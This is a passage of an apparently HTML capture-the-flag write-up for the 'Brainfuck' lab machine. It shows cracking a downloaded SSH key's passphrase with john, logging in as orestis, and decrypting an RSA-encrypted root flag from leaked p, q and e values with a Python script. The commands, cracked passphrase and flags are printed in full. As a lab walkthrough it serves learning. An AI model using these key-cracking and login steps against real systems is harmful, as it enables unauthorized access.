+        Visit <code>https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</code> to download <code>orestis</code>'s ssh key.<br>
+        <br>
+        Use <code>ssh2john</code> to extract the hash, and use <code>john</code> to crack it with you <code>rock.txt</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/brainfuck#&nbsp;locate&nbsp;ssh2john<br>
+                /usr/share/john/ssh2john.py<br>
+                root@gotham:~/ctf/brainfuck#&nbsp;/usr/share/john/ssh2john.py&nbsp;id_rsa&nbsp;&gt;&nbsp;id_rsa.john<br>
+                root@gotham:~/ctf/brainfuck#&nbsp;john&nbsp;--wordlist=/usr/share/wordlists/rockyou.txt&nbsp;id_rsa.john<br>
+                Using&nbsp;default&nbsp;input&nbsp;encoding:&nbsp;UTF-8<br>
+                Loaded&nbsp;1&nbsp;password&nbsp;hash&nbsp;(SSH&nbsp;[RSA/DSA/EC/OPENSSH&nbsp;(SSH&nbsp;private&nbsp;keys)&nbsp;32/32])<br>
+                [...]<br>
+                Press&nbsp;'q'&nbsp;or&nbsp;Ctrl-C&nbsp;to&nbsp;abort,&nbsp;almost&nbsp;any&nbsp;other&nbsp;key&nbsp;for&nbsp;status<br>
+                3poulakia!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(id_rsa)<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Change the permissions of the ssh key to 600, log in as <code>orestis</code>, and grab <code>user.txt</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/brainfuck#&nbsp;chmod&nbsp;600&nbsp;id_rsa<br>
+                root@gotham:~/ctf/brainfuck#&nbsp;ssh&nbsp;orestis@brainfuck.htb&nbsp;-i&nbsp;./id_rsa<br>
+                Enter&nbsp;passphrase&nbsp;for&nbsp;key&nbsp;'./id_rsa':&nbsp;3poulakia!<br>
+                [...]<br>
+                orestis@brainfuck:~$&nbsp;cat&nbsp;user.txt<br>
+                2c11cfbc5b959f73ac15a3310bd097c9
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>8) Inspect /home/orestis</strong></h2><br>
+        Read the files <code>/home/orestis</code><br>
+            <div class="codebox">
+                orestis@brainfuck:~$&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;104K<br>
+                drwxr-xr-x&nbsp;8&nbsp;orestis&nbsp;orestis&nbsp;4.0K&nbsp;Sep&nbsp;20&nbsp;17:41&nbsp;.<br>
+                drwxr-xr-x&nbsp;3&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Apr&nbsp;13&nbsp;&nbsp;2017&nbsp;..<br>
+                -rw-------&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;Dec&nbsp;24&nbsp;&nbsp;2017&nbsp;.bash_history<br>
+                -rw-r--r--&nbsp;1&nbsp;orestis&nbsp;orestis&nbsp;&nbsp;220&nbsp;Apr&nbsp;13&nbsp;&nbsp;2017&nbsp;.bash_logout<br>
+                -rw-r--r--&nbsp;1&nbsp;orestis&nbsp;orestis&nbsp;3.7K&nbsp;Apr&nbsp;13&nbsp;&nbsp;2017&nbsp;.bashrc<br>
+                drwx------&nbsp;2&nbsp;orestis&nbsp;orestis&nbsp;4.0K&nbsp;Apr&nbsp;29&nbsp;&nbsp;2017&nbsp;.cache<br>
+                drwxr-xr-x&nbsp;3&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Apr&nbsp;17&nbsp;&nbsp;2017&nbsp;.composer<br>
+                -rw-------&nbsp;1&nbsp;orestis&nbsp;orestis&nbsp;&nbsp;619&nbsp;Apr&nbsp;29&nbsp;&nbsp;2017&nbsp;debug.txt<br>
+                -rw-rw-r--&nbsp;1&nbsp;orestis&nbsp;orestis&nbsp;&nbsp;580&nbsp;Apr&nbsp;29&nbsp;&nbsp;2017&nbsp;encrypt.sage<br>
+                drwx------&nbsp;3&nbsp;orestis&nbsp;orestis&nbsp;4.0K&nbsp;Apr&nbsp;29&nbsp;&nbsp;2017&nbsp;mail<br>
+                -rw-------&nbsp;1&nbsp;orestis&nbsp;orestis&nbsp;&nbsp;102&nbsp;Sep&nbsp;20&nbsp;17:16&nbsp;.mysql_history<br>
+                -rw-------&nbsp;1&nbsp;orestis&nbsp;orestis&nbsp;&nbsp;329&nbsp;Apr&nbsp;29&nbsp;&nbsp;2017&nbsp;output.txt<br>
+                -rw-r--r--&nbsp;1&nbsp;orestis&nbsp;orestis&nbsp;&nbsp;655&nbsp;Apr&nbsp;13&nbsp;&nbsp;2017&nbsp;.profile<br>
+                drwx------&nbsp;8&nbsp;orestis&nbsp;orestis&nbsp;4.0K&nbsp;Apr&nbsp;29&nbsp;&nbsp;2017&nbsp;.sage<br>
+                drwx------&nbsp;2&nbsp;orestis&nbsp;orestis&nbsp;4.0K&nbsp;Apr&nbsp;17&nbsp;&nbsp;2017&nbsp;.ssh<br>
+                -r--------&nbsp;1&nbsp;orestis&nbsp;orestis&nbsp;&nbsp;&nbsp;33&nbsp;Apr&nbsp;29&nbsp;&nbsp;2017&nbsp;user.txt
+            </div>
+        </div><br>
+        <br>
+        There's an encryption script.<br>
+        <code>sage</code> is a python mathematics library.<br>
+            <div class="codebox">
+                orestis@brainfuck:~$&nbsp;cat&nbsp;encrypt.sage
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                nbits&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1024</span><br>
+                <br>
+                password&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">open</span>(<span style="color:#3ad900;font-weight:400">"/root/root.txt"</span>).read().strip()<br>
+                enc_pass&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">open</span>(<span style="color:#3ad900;font-weight:400">"output.txt"</span>,<span style="color:#3ad900;font-weight:400">"w"</span>)<br>
+                debug&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">open</span>(<span style="color:#3ad900;font-weight:400">"debug.txt"</span>,<span style="color:#3ad900;font-weight:400">"w"</span>)<br>
+                m&nbsp;=&nbsp;Integer(<span style="color:#ff9d00;font-weight:700">int</span>(password.encode(<span style="color:#3ad900;font-weight:400">'hex'</span>),<span style="color:#ff0044;font-weight:400">16</span>))<br>
+                <br>
+                p&nbsp;=&nbsp;random_prime(<span style="color:#ff0044;font-weight:400">2</span>^floor(nbits/<span style="color:#ff0044;font-weight:400">2</span>)-<span style="color:#ff0044;font-weight:400">1</span>,&nbsp;lbound=<span style="color:#ff0044;font-weight:400">2</span>^floor(nbits/<span style="color:#ff0044;font-weight:400">2</span>-<span style="color:#ff0044;font-weight:400">1</span>),&nbsp;proof=<span style="color:#ff0044;font-weight:400">False</span>)<br>
+                q&nbsp;=&nbsp;random_prime(<span style="color:#ff0044;font-weight:400">2</span>^floor(nbits/<span style="color:#ff0044;font-weight:400">2</span>)-<span style="color:#ff0044;font-weight:400">1</span>,&nbsp;lbound=<span style="color:#ff0044;font-weight:400">2</span>^floor(nbits/<span style="color:#ff0044;font-weight:400">2</span>-<span style="color:#ff0044;font-weight:400">1</span>),&nbsp;proof=<span style="color:#ff0044;font-weight:400">False</span>)<br>
+                n&nbsp;=&nbsp;p*q<br>
+                phi&nbsp;=&nbsp;(p-<span style="color:#ff0044;font-weight:400">1</span>)*(q-<span style="color:#ff0044;font-weight:400">1</span>)<br>
+                e&nbsp;=&nbsp;ZZ.random_element(phi)<br>
+                <span style="color:#ff9d00;font-weight:700">while</span>&nbsp;gcd(e,&nbsp;phi)&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;e&nbsp;=&nbsp;ZZ.random_element(phi)<br>
+                <br>
+                <br>
+                <br>
+                c&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">pow</span>(m,&nbsp;e,&nbsp;n)<br>
+                enc_pass.write(<span style="color:#3ad900;font-weight:400">'Encrypted&nbsp;Password:&nbsp;'</span>+<span style="color:#ff9d00;font-weight:700">str</span>(c)+<span style="color:#3ad900;font-weight:400">'\n'</span>)<br>
+                debug.write(<span style="color:#ff9d00;font-weight:700">str</span>(p)+<span style="color:#3ad900;font-weight:400">'\n'</span>)<br>
+                debug.write(<span style="color:#ff9d00;font-weight:700">str</span>(q)+<span style="color:#3ad900;font-weight:400">'\n'</span>)<br>
+                debug.write(<span style="color:#ff9d00;font-weight:700">str</span>(e)+<span style="color:#3ad900;font-weight:400">'\n'</span>)
+            </div>
+        </div><br>
+        <br>
+        <code>encrypt.sage</code> encrypts the root flag in <code>/root/root.txt</code> and writes it to <code>output.txt</code>.<br>
+        It also prints the <code>p</code>, <code>q</code> and <code>e</code> variables into <code>debug.txt</code>, each separated by a new line.<br>
+        <br>
+            <div class="codebox">
+                orestis@brainfuck:~$&nbsp;cat&nbsp;debug.txt&nbsp;<br>
+                7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307<br>
+                7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079<br>
+                30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
+            </div>
+        </div><br>
+        <br>
+        p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307<br>
+        <br>
+        q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079<br>
+        <br>
+        e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997<br>
+        <br>
+            <div class="codebox">
+                orestis@brainfuck:~$&nbsp;cat&nbsp;output.txt&nbsp;<br>
+                Encrypted&nbsp;Password:&nbsp;44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>9) RSA Decrypt</strong></h2><br>
+        If you google some of the lines from the script, you'll find that it's an RSA encryption script.<br>
+        <br>
+        We're given the p, q and e values used in the encryption, as well as the cipher text to decode, which means that we should be able to decode it to plaintext.<br>
+        <br>
+        Googling for <code>rsa decrypt p q e</code> gives a stack overflow answer - <a href="https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e">https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e</a> - where <code>user13741</code> has written a script to extract plaintext from ciphertext using the <code>p</code>, <code>q</code>, and <code>e</code> values.<br>
+        <br>
+        Modify the script and replace the <code>p</code>, <code>q</code>, <code>e</code> and <code>ct</code> variables with the values found in <code>debug.txt</code>.<br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/brainfuck#&nbsp;nano&nbsp;rsadecrypt.py
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">def</span>&nbsp;egcd(a,&nbsp;b):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;x,y,&nbsp;u,v&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,<span style="color:#ff0044;font-weight:400">1</span>,&nbsp;<span style="color:#ff0044;font-weight:400">1</span>,<span style="color:#ff0044;font-weight:400">0</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;a&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;q,&nbsp;r&nbsp;=&nbsp;b//a,&nbsp;b%a<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;m,&nbsp;n&nbsp;=&nbsp;x-u*q,&nbsp;y-v*q<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b,a,&nbsp;x,y,&nbsp;u,v&nbsp;=&nbsp;a,r,&nbsp;u,v,&nbsp;m,n<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gcd&nbsp;=&nbsp;b<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;gcd,&nbsp;x,&nbsp;y<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">def</span>&nbsp;main():<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;p&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;q&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;e&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;ct&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;compute&nbsp;n</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;n&nbsp;=&nbsp;p&nbsp;*&nbsp;q<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Compute&nbsp;phi(n)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;phi&nbsp;=&nbsp;(p&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">1</span>)&nbsp;*&nbsp;(q&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">1</span>)<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Compute&nbsp;modular&nbsp;inverse&nbsp;of&nbsp;e</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;gcd,&nbsp;a,&nbsp;b&nbsp;=&nbsp;egcd(e,&nbsp;phi)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;d&nbsp;=&nbsp;a<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(&nbsp;<span style="color:#3ad900;font-weight:400">"n:&nbsp;&nbsp;"</span>&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">str</span>(d)&nbsp;);<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Decrypt&nbsp;ciphertext</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;pt&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">pow</span>(ct,&nbsp;d,&nbsp;n)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(&nbsp;<span style="color:#3ad900;font-weight:400">"pt:&nbsp;"</span>&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">str</span>(pt)&nbsp;)<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#333333;font-weight:400">__name__</span>&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"__main__"</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;main()
+            </div>
+        </div><br>
+        <br>
+        Run the script, and it will succesfully decode the ciphertext to plaintext.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/brainfuck#&nbsp;python&nbsp;rsadecrypt.py&nbsp;<br>
+                n:&nbsp;&nbsp;8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977<br>
+                pt:&nbsp;24604052029401386049980296953784287079059245867880966944246662849341507003750
+            </div>
+        </div><br>
+        <br>
+        The plaintext should be the contents of <code>/root/root.txt</code>.<br>
+        However, the printed plaintext doesn't look like a root flag.<br>
+        <br>
+        This line from the original encrypt.sage - <code>m = Integer(int(password.encode('hex'),16))</code> - converts the root flag into a hexadecimal string - <code>password.encode('hex')</code> - and then converts that hexadecimal value from base 16 to base 10 - <code>int(hex_root_flag,16)</code>.<br>
+        <br>
+        Therefore, the plaintext that <code>user13741</code>'s script has computed - <code>24604052029401386049980296953784287079059245867880966944246662849341507003750</code> - is a decimal value, which needs to converted to hexadecimal and then decoded.<br>
+        <br>
+        Convert the decimal number to hex using <code>python -c "print format(&lt;DECIMAL NUMBER&gt;, 'x')</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/brainfuck#&nbsp;python&nbsp;-c&nbsp;"print&nbsp;format(24604052029401386049980296953784287079059245867880966944246662849341507003750,&nbsp;'x')"<br>
+                3665666331613564626238393034373531636536353636613330356262386566
+            </div>
+        </div><br>
+        <br>
+        And decode the hexadecimal value using <code>python -c "decode = str(&lt;HEX NUMBER&gt;).decode('hex'); print decode"</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/brainfuck#&nbsp;python&nbsp;-c&nbsp;"decode&nbsp;=&nbsp;str(3665666331613564626238393034373531636536353636613330356262386566).decode('hex');&nbsp;print&nbsp;decode"<br>
+                6efc1a5dbb8904751ce6566a305bb8ef
+            </div>
+        </div><br>
+        <br>
+        Or here's a one-liner to do both of those things:<br>
+        <code>python -c "print format(&lt;DECIMAL NUMBER&gt;, 'x').decode('hex')"</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/brainfuck#&nbsp;python&nbsp;-c&nbsp;"print&nbsp;format(24604052029401386049980296953784287079059245867880966944246662849341507003750,&nbsp;'x').decode('hex')"<br>
+                6efc1a5dbb8904751ce6566a305bb8ef
+            </div>
+        </div><br>
+        <br>
+        <code>6efc1a5dbb8904751ce6566a305bb8ef</code> is the root flag!<br>
+        Go bathe in the crypto cracker's private pool :))<br>
+    </writeup>
+</section>
+
+</body>
+</html>
